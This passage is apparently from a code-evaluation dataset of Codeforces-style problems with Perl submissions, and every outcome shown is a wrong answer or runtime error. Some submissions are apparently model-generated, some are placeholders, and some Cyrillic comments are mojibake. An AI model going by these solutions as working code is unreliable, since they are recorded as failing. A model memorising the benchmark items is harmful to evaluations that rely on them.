(00\u2264HH\u226423, 00\u2264MM\u226459). The mantel clock initially shows 12:00.\nPretests contain times of the beginning of some morning TV programs of the Channel One Russia.\n","output_spec":"Print two numbers x and y \u2014 the angles of turning the hour and minute hands, respectively (0\u2264x,y<360). The absolute or relative error in the answer should not exceed 10^-9.\n","notes":"A note to the second example: the hour hand will be positioned exactly in the middle, between 4 and 5.\n","sample_inputs":["12:00\n","04:30\n","08:17\n"],"sample_outputs":["0 0","135 180","248.5 102"]}
{"difficulty":1100,"lang":"Perl","lang_cluster":"perl","src_uid":"82_A","submission_id":"6005202","tags":["implementation","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/perl\r\nuse bigint;\r\nchomp($n=<>);\r\nmy @array=qw (Sheldon Leonard Penny Rajesh Howard);\r\n$i=1;\r\n$c=$i*5;\r\nwhile ($c<$n){\r\n$n-=$i*5;\r\n$i=$i*2;\r\n}\r\n$n = $n%($i*5);\r\n$n -=1;\r\n$n=($n-($n%$i)\/$i);\r\nprint ($array[$n]);","description":"Sheldon, Leonard, Penny, Rajesh and Howard are in the queue for a \"Double Cola\" drink vending machine; there are no other people in the queue. The first one in the queue (Sheldon) buys a can, drinks it and doubles! The resulting two Sheldons go to the end of the queue. Then the next in the queue (Leonard) buys a can, drinks it and gets to the end of the queue as two Leonards, and so on. This process continues ad infinitum.For example, Penny drinks the third can of cola and the queue will look like this: Rajesh, Howard, Sheldon, Sheldon, Leonard, Leonard, Penny, Penny.Write a program that will print the name of a man who will drink the n-th can.Note that in the very beginning the queue looks like that: Sheldon, Leonard, Penny, Rajesh, Howard. The first person is Sheldon.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consist of a single integer n (1\u2264n\u226410^9).\nIt is guaranteed that the pretests check the spelling of all the five names, that is, that they contain all the five possible answers.\n","output_spec":"Print the single line \u2014 the name of the person who drinks the n-th can of cola. The cans are numbered starting from 1. Please note that you should spell the names like this: \"Sheldon\", \"Leonard\", \"Penny\", \"Rajesh\", \"Howard\" (without the quotes). In that order precisely the friends are in the queue initially.\n","notes":null,"sample_inputs":["1\n","6\n","1802\n"],"sample_outputs":["Sheldon\n","Sheldon\n","Penny\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"83_A","submission_id":"6435622","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl -w\n\nuse strict;\n\nsub magic {\n    my @a = @{$_[0]};\n    my $cur = 'inf';\n    my $c = 1;\n    my $s = 0;\n    for (@a) {\n        if ($cur != $_) {\n            $s += $c * ($c + 1) \/ 2;\n            $c = 1;\n        } else {\n            $c++;\n        }\n        $cur = $_;\n    }\n    $s;\n}\n\n<>;\nmy @a = split ' ', <>;\nprint magic(\\@a), \"\\n\";\n","description":"Valery is very interested in magic. Magic attracts him so much that he sees it everywhere. He explains any strange and weird phenomenon through intervention of supernatural forces. But who would have thought that even in a regular array of numbers Valera manages to see something beautiful and magical.Valera absolutely accidentally got a piece of ancient parchment on which an array of numbers was written. He immediately thought that the numbers in this array were not random. As a result of extensive research Valera worked out a wonderful property that a magical array should have: an array is defined as magic if its minimum and maximum coincide.He decided to share this outstanding discovery with you, but he asks you for help in return. Despite the tremendous intelligence and wit, Valera counts very badly and so you will have to complete his work. All you have to do is count the number of magical subarrays of the original array of numbers, written on the parchment. Subarray is defined as non-empty sequence of consecutive elements.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2264n\u226410^5). The second line contains an array of original integers a1,a2,...,an (-10^9\u2264ai\u226410^9). \n","output_spec":"Print on the single line the answer to the problem: the amount of subarrays, which are magical.\nPlease do not use the %lld specificator to read or write 64-bit numbers in C++. It is recommended to use cin, cout streams (you can also use the %I64d specificator).\n","notes":"Notes to sample tests:\nMagical subarrays are shown with pairs of indices [a;b] of the beginning and the end.\nIn the first sample: [1;1], [2;2], [3;3], [4;4], [2;3].\nIn the second sample: [1;1], [2;2], [3;3], [4;4], [5;5], [1;2], [2;3], [1;3]. \n","sample_inputs":["4\n2 1 1 4\n","5\n-2 -2 -2 0 1\n"],"sample_outputs":["5\n","8\n"]}
{"difficulty":1200,"lang":"Perl","lang_cluster":"perl","src_uid":"899_B","submission_id":"33346160","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\n\nuse warnings;\nuse strict;\n\n$\\ = $\/;\n\nmy $y = join ' ',\n\tmap {\n\t\tjoin ' ', 31, $_,\n\t\t\tqq{ \n\t\t\t... \u00d0\u00b2 \u00d0\u00bc\u00d0\u00b0\u00d1\u0080\u00d1\u0082\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c, \u00d0\u00b2 \u00d0\u00b0\u00d0\u00bf\u00d1\u0080\u00d0\u00b5\u00d0\u00bb\u00d0\u00b5 30 \u00d0\u00b4\u00d0\u00bd\u00d0\u00b5\u00d0\u00b9, \n\t\t\t\u00d0\u00b2 \u00d0\u00bc\u00d0\u00b0\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c, \u00d0\u00b2 \u00d0\u00b8\u00d1\u008e\u00d0\u00bd\u00d0\u00b5 30 \u00d0\u00b4\u00d0\u00bd\u00d0\u00b5\u00d0\u00b9, \u00d0\u00b2 \u00d0\u00b8\u00d1\u008e\u00d0\u00bb\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c, \n\t\t\t\u00d0\u00b2 \u00d0\u00b0\u00d0\u00b2\u00d0\u00b3\u00d1\u0083\u00d1\u0081\u00d1\u0082\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c, \u00d0\u00b2 \u00d1\u0081\u00d0\u00b5\u00d0\u00bd\u00d1\u0082\u00d1\u008f\u00d0\u00b1\u00d1\u0080\u00d0\u00b5 30 \u00d0\u00b4\u00d0\u00bd\u00d0\u00b5\u00d0\u00b9, \u00d0\u00b2 \u00d0\u00be\u00d0\u00ba\u00d1\u0082\u00d1\u008f\u00d0\u00b1\u00d1\u0080\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c, \n\t\t\t\u00d0\u00b2 \u00d0\u00bd\u00d0\u00be\u00d1\u008f\u00d0\u00b1\u00d1\u0080\u00d0\u00b5 30 \u00d0\u00b4\u00d0\u00bd\u00d0\u00b5\u00d0\u00b9, \u00d0\u00b2 \u00d0\u00b4\u00d0\u00b5\u00d0\u00ba\u00d0\u00b0\u00d0\u00b1\u00d1\u0080\u00d0\u00b5 31 \u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\u00d1\u008c. \n\t\t\t} =~ \/\\d+\/g\n\t} 28, 28, 29, 28;\n\nwhile(<>){\n\t$_ = <>, chomp;\n\t\n\tprint $y =~ \/$_\/ ? \"Yes\" : \"No\";\n\t}","description":"Everybody in Russia uses Gregorian calendar. In this calendar there are 31 days in January, 28 or 29 days in February (depending on whether the year is leap or not), 31 days in March, 30 days in April, 31 days in May, 30 in June, 31 in July, 31 in August, 30 in September, 31 in October, 30 in November, 31 in December.A year is leap in one of two cases: either its number is divisible by 4, but not divisible by 100, or is divisible by 400. For example, the following years are leap: 2000, 2004, but years 1900 and 2018 are not leap.In this problem you are given n (1\u2264n\u226424) integers a1,a2,...,an, and you have to check if these integers could be durations in days of n consecutive months, according to Gregorian calendar. Note that these months could belong to several consecutive years. In other words, check if there is a month in some year, such that its duration is a1 days, duration of the next month is a2 days, and so on.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains single integer n (1\u2264n\u226424) \u2014 the number of integers.\nThe second line contains n integers a1,a2,...,an (28\u2264ai\u226431) \u2014 the numbers you are to check.\n","output_spec":"If there are several consecutive months that fit the sequence, print \"YES\" (without quotes). Otherwise, print \"NO\" (without quotes).\nYou can print each letter in arbitrary case (small or large).\n","notes":"In the first example the integers can denote months July, August, September and October.\nIn the second example the answer is no, because there are no two consecutive months each having 30 days.\nIn the third example the months are: February (leap year) \u2014 March \u2014 April \u2013 May \u2014 June.\nIn the fourth example the number of days in the second month is 28, so this is February. March follows February and has 31 days, but not 30, so the answer is NO.\nIn the fifth example the months are: December \u2014 January \u2014 February (non-leap year).\n","sample_inputs":["4\n31 31 30 31\n","2\n30 30\n","5\n29 31 30 31 30\n","3\n31 28 30\n","3\n31 31 28\n"],"sample_outputs":["Yes\n\n","No\n\n","Yes\n\n","No\n\n","Yes\n\n"]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"1095_F","submission_id":"1095_F_gpt34_0","tags":["dsu","graphs","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"# Read input\\nmy ($n, $m) = split(' ', <STDIN>);\\nchomp(my $vertex_values = <STDIN>);\\nmy @a = split(' ', $vertex_values);\\nmy @special_offers;\\n\\n# Read special offers\\nfor (my $i = 0; $i < $m; $i++) {\\n    chomp(my $offer = <STDIN>);\\n    my ($x, $y, $w) = split(' ', $offer);\\n    push @special_offers, [$x, $y, $w];\\n}\\n\\n# Sort special offers by cost in ascending order\\n@special_offers = sort { $a->[2] <=> $b->[2] } @special_offers;\\n\\n# Initialize disjoint set data structure\\nmy @parent = (0..$n);\\nmy @rank = (0..$n);\\n\\n# Find operation for disjoint set data structure\\nsub find {\\n    my ($x) = @_;\\n    if ($parent[$x] != $x) {\\n        $parent[$x] = find($parent[$x]);\\n    }\\n    return $parent[$x];\\n}\\n\\n# Union operation for disjoint set data structure\\nsub union {\\n    my ($x, $y) = @_;\\n    my $x_root = find($x);\\n    my $y_root = find($y);\\n    if ($x_root == $y_root) {\\n        return;\\n    }\\n    if ($rank[$x_root] < $rank[$y_root]) {\\n        ($x_root, $y_root) = ($y_root, $x_root);\\n    }\\n    $parent[$y_root] = $x_root;\\n    if ($rank[$x_root] == $rank[$y_root]) {\\n        $rank[$x_root]++;\\n    }\\n}\\n\\n# Kruskal's algorithm to find minimum spanning tree\\nmy $total_cost = 0;\\nforeach my $offer (@special_offers) {\\n    my ($x, $y, $w) = @$offer;\\n    if (find($x) != find($y)) {\\n        union($x, $y);\\n        $total_cost += $w;\\n    }\\n}\\n\\n# Add remaining edges with their costs\\nfor (my $i = 1; $i <= $n; $i++) {\\n    for (my $j = $i + 1; $j <= $n; $j++) {\\n        if (find($i) != find($j)) {\\n            my $cost = $a[$i - 1] + $a[$j - 1];\\n            $total_cost += $cost;\\n            union($i, $j);\\n        }\\n    }\\n}\\n\\n# Print the minimum number of coins required\\nprint $total_cost;\" }]","description":"You are given an undirected graph consisting of $$$n$$$ vertices. A number is written on each vertex; the number on vertex $$$i$$$ is $$$a_i$$$. Initially there are no edges in the graph.You may add some edges to this graph, but you have to pay for them. The cost of adding an edge between vertices $$$x$$$ and $$$y$$$ is $$$a_x + a_y$$$ coins. There are also $$$m$$$ special offers, each of them is denoted by three numbers $$$x$$$, $$$y$$$ and $$$w$$$, and means that you can add an edge connecting vertices $$$x$$$ and $$$y$$$ and pay $$$w$$$ coins for it. You don't have to use special offers: if there is a pair of vertices $$$x$$$ and $$$y$$$ that has a special offer associated with it, you still may connect these two vertices paying $$$a_x + a_y$$$ coins for it.What is the minimum number of coins you have to spend to make the graph connected? Recall that a graph is connected if it's possible to get from any vertex to any other vertex using only the edges belonging to this graph.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$1 \\\\le n \\\\le 2 \\\\cdot 10^5$$$, $$$0 \\\\le m \\\\le 2 \\\\cdot 10^5$$$) \u2014 the number of vertices in the graph and the number of special offers, respectively.\nThe second line contains $$$n$$$ integers $$$a_1, a_2, \\\\dots, a_n$$$ ($$$1 \\\\le a_i \\\\le 10^{12}$$$) \u2014 the numbers written on the vertices.\nThen $$$m$$$ lines follow, each containing three integers $$$x$$$, $$$y$$$ and $$$w$$$ ($$$1 \\\\le x, y \\\\le n$$$, $$$1 \\\\le w \\\\le 10^{12}$$$, $$$x \\\\ne y$$$) denoting a special offer: you may add an edge connecting vertex $$$x$$$ and vertex $$$y$$$, and this edge will cost $$$w$$$ coins.\n","output_spec":"Print one integer \u2014 the minimum number of coins you have to pay to make the graph connected.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"1163_C1","submission_id":"1163_C1_gpt34_2","tags":["brute+force","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"use strict;\\nuse warnings;\\n\\n# Read input\\nmy $n = <STDIN>;\\nchomp $n;\\n\\nmy @poles;\\nfor (my $i = 0; $i < $n; $i++) {\\n    my $line = <STDIN>;\\n    chomp $line;\\n    my ($x, $y) = split ' ', $line;\\n    push @poles, { x => $x, y => $y };\\n}\\n\\n# Count intersecting pairs\\nmy $count = 0;\\nfor (my $i = 0; $i < $n; $i++) {\\n    for (my $j = $i + 1; $j < $n; $j++) {\\n        for (my $k = $j + 1; $k < $n; $k++) {\\n            my $x1 = $poles[$i]->{x};\\n            my $y1 = $poles[$i]->{y};\\n            my $x2 = $poles[$j]->{x};\\n            my $y2 = $poles[$j]->{y};\\n            my $x3 = $poles[$k]->{x};\\n            my $y3 = $poles[$k]->{y};\\n\\n            if ((($x2 - $x1) * ($y3 - $y1)) == (($x3 - $x1) * ($y2 - $y1))) {\\n                $count++;\\n            }\\n        }\\n    }\\n}\\n\\n# Print the result\\nprint $count;\\n","description":"This problem is same as the next one, but has smaller constraints.It was a Sunday morning when the three friends Selena, Shiro and Katie decided to have a trip to the nearby power station (do not try this at home). After arriving at the power station, the cats got impressed with a large power transmission system consisting of many chimneys, electric poles, and wires. Since they are cats, they found those things gigantic.At the entrance of the station, there is a map describing the complicated wiring system. Selena is the best at math among three friends. He decided to draw the map on the Cartesian plane. Each pole is now a point at some coordinates $$$(x_i, y_i)$$$. Since every pole is different, all of the points representing these poles are distinct. Also, every two poles are connected with each other by wires. A wire is a straight line on the plane infinite in both directions. If there are more than two poles lying on the same line, they are connected by a single common wire.Selena thinks, that whenever two different electric wires intersect, they may interfere with each other and cause damage. So he wonders, how many pairs are intersecting? Could you help him with this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$2 \\\\le n \\\\le 50$$$)\u00a0\u2014 the number of electric poles.\nEach of the following $$$n$$$ lines contains two integers $$$x_i$$$, $$$y_i$$$ ($$$-10^4 \\\\le x_i, y_i \\\\le 10^4$$$)\u00a0\u2014 the coordinates of the poles.\nIt is guaranteed that all of these $$$n$$$ points are distinct.\n","output_spec":"Print a single integer\u00a0\u2014 the number of pairs of wires that are intersecting.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1700,"lang":"Perl","lang_cluster":"perl","src_uid":"131_E","submission_id":"131_E_gpt34_1","tags":["sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"\\nuse strict;\\nuse warnings;\\n\\nsub count_threats {\\n    my ($n, $m, @queens) = @_;\\n    \\n    my @threats = (0) x 9;\\n    \\n    for (my $i = 0; $i < $m; $i++) {\\n        my ($row, $col) = split(' ', $queens[$i]);\\n        \\n        # Count threats in horizontal and vertical directions\\n        for (my $j = 1; $j <= $n; $j++) {\\n            if ($j != $row) {\\n                $threats[1]++ if ($queens[$i] =~ \/^$j $col$\/);\\n            }\\n            if ($j != $col) {\\n                $threats[1]++ if ($queens[$i] =~ \/^$row $j$\/);\\n            }\\n        }\\n        \\n        # Count threats in diagonal directions\\n        for (my $j = 1; $j <= $n; $j++) {\\n            if ($j != $row && $j != $col) {\\n                $threats[1]++ if ($queens[$i] =~ \/^$j $j$\/);\\n                $threats[1]++ if ($queens[$i] =~ \/^$j @{[ $col - $row + $j ]}$\/);\\n                $threats[1]++ if ($queens[$i] =~ \/^$j @{[ $col + $row - $j ]}$\/);\\n            }\\n        }\\n    }\\n    \\n    foreach my $threat (@threats) {\\n        print \"$threat \";\\n    }\\n}\\n\\nmy $input = <>;\\nchomp($input);\\nmy ($n, $m) = split(' ', $input);\\nmy @queens;\\nfor (my $i = 0; $i < $m; $i++) {\\n    my $queen = <>;\\n    chomp($queen);\\n    push @queens, $queen;\\n}\\n\\ncount_threats($n, $m, @queens);\\n","description":"A queen is the strongest chess piece. In modern chess the queen can move any number of squares in any horizontal, vertical or diagonal direction (considering that there're no other pieces on its way). The queen combines the options given to the rook and the bishop.There are m queens on a square n\u00d7n chessboard. You know each queen's positions, the i-th queen is positioned in the square (ri,ci), where ri is the board row number (numbered from the top to the bottom from 1 to n), and ci is the board's column number (numbered from the left to the right from 1 to n). No two queens share the same position.For each queen one can count w \u2014 the number of other queens that the given queen threatens (attacks). For a fixed attack direction only the first queen in this direction is under attack if there are many queens are on the ray of the attack. Obviously, for any queen w is between 0 and 8, inclusive.Print the sequence t0,t1,...,t8, where ti is the number of queens that threaten exactly i other queens, i.e. the number of queens that their w equals i.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a pair of integers n,m (1\u2264n,m\u226410^5), where n is the size of the board and m is the number of queens on the board. Then m following lines contain positions of the queens, one per line. Each line contains a pair of integers ri,ci (1\u2264ri,ci\u2264n) \u2014 the queen's position. No two queens stand on the same square.\n","output_spec":"Print the required sequence t0,t1,...,t8, separating the numbers with spaces.\n","notes":null,"sample_inputs":["8 4\n4 3\n4 8\n6 5\n1 6\n","10 3\n1 1\n1 2\n1 3\n"],"sample_outputs":["0 3 0 1 0 0 0 0 0 ","0 2 1 0 0 0 0 0 0 "]}
{"difficulty":2600,"lang":"Perl","lang_cluster":"perl","src_uid":"13_D","submission_id":"13_D_gpt34_4","tags":["dp","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"\\nuse strict;\\nuse warnings;\\n\\nsub count_triangles {\\n    my ($n, $m, $red_points, $blue_points) = @_;\\n\\n    my $count = 0;\\n\\n    for (my $i = 0; $i < $n - 2; $i++) {\\n        for (my $j = $i + 1; $j < $n - 1; $j++) {\\n            for (my $k = $j + 1; $k < $n; $k++) {\\n                my ($x1, $y1) = @{$red_points->[$i]};\\n                my ($x2, $y2) = @{$red_points->[$j]};\\n                my ($x3, $y3) = @{$red_points->[$k]};\\n\\n                my $is_triangle = 1;\\n\\n                for (my $l = 0; $l < $m; $l++) {\\n                    my ($bx, $by) = @{$blue_points->[$l]};\\n\\n                    my $cross_product = ($x2 - $x1) * ($by - $y1) - ($y2 - $y1) * ($bx - $x1);\\n\\n                    if ($cross_product > 0 && ($x3 - $x1) * ($by - $y1) - ($y3 - $y1) * ($bx - $x1) > 0 && ($x1 - $x2) * ($by - $y2) - ($y1 - $y2) * ($bx - $x2) > 0) {\\n                        $is_triangle = 0;\\n                        last;\\n                    }\\n                }\\n\\n                $count += $is_triangle;\\n            }\\n        }\\n    }\\n\\n    return $count;\\n}\\n\\nmy $input = <STDIN>;\\nchomp $input;\\nmy ($n, $m) = split ' ', $input;\\n\\nmy @red_points;\\nfor (my $i = 0; $i < $n; $i++) {\\n    my $point = <STDIN>;\\n    chomp $point;\\n    my ($x, $y) = split ' ', $point;\\n    push @red_points, [$x, $y];\\n}\\n\\nmy @blue_points;\\nfor (my $i = 0; $i < $m; $i++) {\\n    my $point = <STDIN>;\\n    chomp $point;\\n    my ($x, $y) = split ' ', $point;\\n    push @blue_points, [$x, $y];\\n}\\n\\nmy $result = count_triangles($n, $m, \\@red_points, \\@blue_points);\\nprint $result;\\n","description":"Little Petya likes to draw. He drew N red and M blue points on the plane in such a way that no three points lie on the same line. Now he wonders what is the number of distinct triangles with vertices in red points which do not contain any blue point inside.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two non-negative integer numbers N and M (0\u2264N\u2264500, 0\u2264M\u2264500) \u2014 the number of red and blue points respectively. The following N lines contain two integer numbers each \u2014 coordinates of red points. The following M lines contain two integer numbers each \u2014 coordinates of blue points. All coordinates do not exceed 10^9 by absolute value.\n","output_spec":"Output one integer \u2014 the number of distinct triangles with vertices in red points which do not contain any blue point inside.\n","notes":null,"sample_inputs":["4 1\n0 0\n10 0\n10 10\n5 4\n2 1\n","5 5\n5 10\n6 1\n8 6\n-6 -7\n7 -1\n5 -1\n10 -4\n-10 -8\n-10 5\n-2 -8\n"],"sample_outputs":["2\n","7\n"]}
{"difficulty":2000,"lang":"Perl","lang_cluster":"perl","src_uid":"156_C","submission_id":"54756208","tags":["combinatorics","dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"test","description":"Sherlock Holmes found a mysterious correspondence of two VIPs and made up his mind to read it. But there is a problem! The correspondence turned out to be encrypted. The detective tried really hard to decipher the correspondence, but he couldn't understand anything. At last, after some thought, he thought of something. Let's say there is a word s, consisting of |s| lowercase Latin letters. Then for one operation you can choose a certain position p (1\u2264p<|s|) and perform one of the following actions:   either replace letter sp with the one that alphabetically follows it and replace letter sp+1 with the one that alphabetically precedes it;  or replace letter sp with the one that alphabetically precedes it and replace letter sp+1 with the one that alphabetically follows it. Let us note that letter \"z\" doesn't have a defined following letter and letter \"a\" doesn't have a defined preceding letter. That's why the corresponding changes are not acceptable. If the operation requires performing at least one unacceptable change, then such operation cannot be performed.Two words coincide in their meaning iff one of them can be transformed into the other one as a result of zero or more operations.Sherlock Holmes needs to learn to quickly determine the following for each word: how many words can exist that coincide in their meaning with the given word, but differs from the given word in at least one character? Count this number for him modulo 1000000007 (10^9+7).","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains several tests. The first line contains the only integer t (1\u2264t\u226410^4) \u2014 the number of tests.\nNext t lines contain the words, one per line. Each word consists of lowercase Latin letters and has length from 1 to 100, inclusive. Lengths of words can differ.\n","output_spec":"For each word you should print the number of different other words that coincide with it in their meaning \u2014 not from the words listed in the input data, but from all possible words. As the sought number can be very large, print its value modulo 1000000007 (10^9+7).\n","notes":"Some explanations about the operation:\n  Note that for each letter, we can clearly define the letter that follows it. Letter \"b\" alphabetically follows letter \"a\", letter \"c\" follows letter \"b\", ..., \"z\" follows letter \"y\".  Preceding letters are defined in the similar manner: letter \"y\" precedes letter \"z\", ..., \"a\" precedes letter \"b\".  Note that the operation never changes a word's length. In the first sample you can obtain the only other word \"ba\". In the second sample you cannot obtain any other word, so the correct answer is 0.\nConsider the third sample. One operation can transform word \"klmbfxzb\" into word \"klmcexzb\": we should choose p=4, and replace the fourth letter with the following one (\"b\" \u2192 \"c\"), and the fifth one \u2014 with the preceding one (\"f\" \u2192 \"e\"). Also, we can obtain many other words from this one. An operation can transform word \"ya\" only into one other word \"xb\". \nWord \"ya\" coincides in its meaning with words \"xb\", \"wc\", \"vd\", ..., \"ay\" (overall there are 24 other words). The word \"klmbfxzb has many more variants \u2014 there are 3320092814 other words that coincide with in the meaning. So the answer for the first word equals 24 and for the second one equals 320092793 \u2014 the number 3320092814 modulo 10^9+7\n","sample_inputs":["1\nab\n","1\naaaaaaaaaaa\n","2\nya\nklmbfxzb\n"],"sample_outputs":["1\n","0\n","24\n320092793\n"]}
{"difficulty":1600,"lang":"Perl","lang_cluster":"perl","src_uid":"167_A","submission_id":"1460665","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"print \"Hello, World!\\n\";","description":"In some country live wizards. They love to ride trolleybuses.A city in this country has a trolleybus depot with n trolleybuses. Every day the trolleybuses leave the depot, one by one and go to the final station. The final station is at a distance of d meters from the depot. We know for the i-th trolleybus that it leaves at the moment of time ti seconds, can go at a speed of no greater than vi meters per second, and accelerate with an acceleration no greater than a meters per second squared. A trolleybus can decelerate as quickly as you want (magic!). It can change its acceleration as fast as you want, as well. Note that the maximum acceleration is the same for all trolleys.Despite the magic the trolleys are still powered by an electric circuit and cannot overtake each other (the wires are to blame, of course). If a trolleybus catches up with another one, they go together one right after the other until they arrive at the final station. Also, the drivers are driving so as to arrive at the final station as quickly as possible.You, as head of the trolleybuses' fans' club, are to determine for each trolley the minimum time by which it can reach the final station. At the time of arrival at the destination station the trolleybus does not necessarily have zero speed. When a trolley is leaving the depot, its speed is considered equal to zero. From the point of view of physics, the trolleybuses can be considered as material points, and also we should ignore the impact on the speed of a trolley bus by everything, except for the acceleration and deceleration provided by the engine.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains three space-separated integers n, a, d (1\u2264n\u226410^5, 1\u2264a,d\u226410^6) \u2014 the number of trolleybuses, their maximum acceleration and the distance from the depot to the final station, correspondingly.\nNext n lines contain pairs of integers ti vi (0\u2264t1<t2...<tn-1<tn\u226410^6, 1\u2264vi\u226410^6) \u2014 the time when the i-th trolleybus leaves the depot and its maximum speed, correspondingly. The numbers in the lines are separated by spaces.\n","output_spec":"For each trolleybus print a single line the time it arrives to the final station. Print the times for the trolleybuses in the order in which the trolleybuses are given in the input. The answer will be accepted if the absolute or relative error doesn't exceed 10^-4.\n","notes":"In the first sample the second trolleybus will catch up with the first one, that will happen at distance 510.5 meters from the depot. The trolleybuses will go the remaining 9489.5 meters together at speed 10 meters per second. As a result, both trolleybuses will arrive to the final station by the moment of time 1000.5 seconds. The third trolleybus will not catch up with them. It will arrive to the final station by the moment of time 11000.05 seconds.\n","sample_inputs":["3 10 10000\n0 10\n5 11\n1000 1\n","1 2 26\n28 29\n"],"sample_outputs":["1000.5000000000\n1000.5000000000\n11000.0500000000\n","33.0990195136\n"]}
{"difficulty":2600,"lang":"Perl","lang_cluster":"perl","src_uid":"177_G2","submission_id":"177_G2_gpt34_3","tags":["matrices","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"use strict;\\nuse warnings;\\n\\nsub fibonacci_strings {\\n    my ($k, $m, @queries) = @_;\\n    my @fibonacci = ('a', 'b');\\n    for (my $i = 2; $i < $k; $i++) {\\n        $fibonacci[$i] = $fibonacci[$i-1] . $fibonacci[$i-2];\\n    }\\n    my @results;\\n    foreach my $query (@queries) {\\n        my $count = 0;\\n        foreach my $fib_str (@fibonacci) {\\n            while ($fib_str =~ \/$query\/g) {\\n                $count++;\\n            }\\n        }\\n        push @results, $count;\\n    }\\n    return \\@results;\\n}\\n\\nmy $input = <STDIN>;\\nchomp $input;\\nmy ($k, $m) = split ' ', $input;\\nmy @queries;\\nfor (my $i = 0; $i < $m; $i++) {\\n    my $query = <STDIN>;\\n    chomp $query;\\n    push @queries, $query;\\n}\\n\\nmy $output = fibonacci_strings($k, $m, @queries);\\nforeach my $result (@$output) {\\n    print $result % 1000000007 . \\\"\\\\n\\\";\\n}","description":"Fibonacci strings are defined as follows:   f1 = \u00aba\u00bb  f2 = \u00abb\u00bb  fn = fn-1\u00a0fn-2, n>2 Thus, the first five Fibonacci strings are: \"a\", \"b\", \"ba\", \"bab\", \"babba\".You are given a Fibonacci string and m strings si. For each string si, find the number of times it occurs in the given Fibonacci string as a substring.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers k and m \u2014 the number of a Fibonacci string and the number of queries, correspondingly.\nNext m lines contain strings si that correspond to the queries. It is guaranteed that strings si aren't empty and consist only of characters \"a\" and \"b\".\nThe input limitations for getting 30 points are: \n  1\u2264k\u22643000  1\u2264m\u22643000  The total length of strings si doesn't exceed 3000  The input limitations for getting 100 points are: \n  1\u2264k\u226410^18  1\u2264m\u226410^4  The total length of strings si doesn't exceed 10^5  Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.\n","output_spec":"For each string si print the number of times it occurs in the given Fibonacci string as a substring. Since the numbers can be large enough, print them modulo 1000000007 (10^9+7). Print the answers for the strings in the order in which they are given in the input.\n","notes":null,"sample_inputs":["6 5\na\nb\nab\nba\naba\n"],"sample_outputs":["3\n5\n3\n3\n1\n"]}
{"difficulty":1800,"lang":"Perl","lang_cluster":"perl","src_uid":"195_C","submission_id":"1909130","tags":["expression+parsing","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/local\/bin\/perl\r\n$n              = <>;\r\n$openBlocks     = 0;\r\n$needlessBlocks =\r\n  0;    #\u00d1\u008d\u00d1\u0082\u00d0\u00be \u00d0\u00b1\u00d0\u00bb\u00d0\u00be\u00d0\u00ba\u00d0\u00b8, \u00d0\u00be\u00d1\u0082\u00d0\u00ba\u00d1\u0080\u00d1\u008b\u00d1\u0082\u00d1\u008b\u00d0\u00b5 \u00d0\u00bf\u00d0\u00be\u00d1\u0081\u00d0\u00bb\u00d0\u00b5 \u00d1\u008d\u00d0\u00ba\u00d1\u0081\u00d0\u00b5\u00d0\u00bf\u00d1\u0088\u00d0\u00b5\u00d0\u00bd\u00d0\u00b0 TODO\r\n$wasThrow = 0;\r\n$eType;\r\nfor ( 1 .. $n ) {\r\n    my $line = <>;\r\n\r\n    if ( $line =~ \/\\s*try\\s*\/ ) {\r\n        if ( $wasThrow == 0 ) {\r\n            $openBlocks++;\r\n        }\r\n        else {\r\n            $needlessBlocks++;\r\n        }\r\n        next;\r\n    }\r\n    if ( $line =~ \/\\s*throw\\s*\\(\\s*(\\w+)\\s*\\)\/ ) {\r\n        $wasThrow = 1;\r\n        $eType    = $1;\r\n        maybeError();\r\n        next;\r\n    }\r\n    if ( $line =~ \/\\s*catch\\s*\\(\\s*(\\w+)\\s*,\\s*\"(.+)\"\\s*\\)\/ ) {\r\n        if ( $needlessBlocks > 0 ) {\r\n            $needlessBlocks--;\r\n            next;\r\n        }\r\n        $openBlocks--;\r\n        if ( $wasThrow != 0 && $eType eq $1 ) {\r\n            print $2. \"\\n\";\r\n            exit;\r\n        }\r\n        if ($wasThrow != 0){            \r\n        maybeError();\r\n        }       \r\n\r\n    }\r\n}\r\nprint \"Unhandled Exception\\n\";\r\n\r\nsub maybeError {\r\n    if ( $openBlocks == 0 ) {\r\n        print \"Unhandled Exception\\n\";\r\n        exit;\r\n    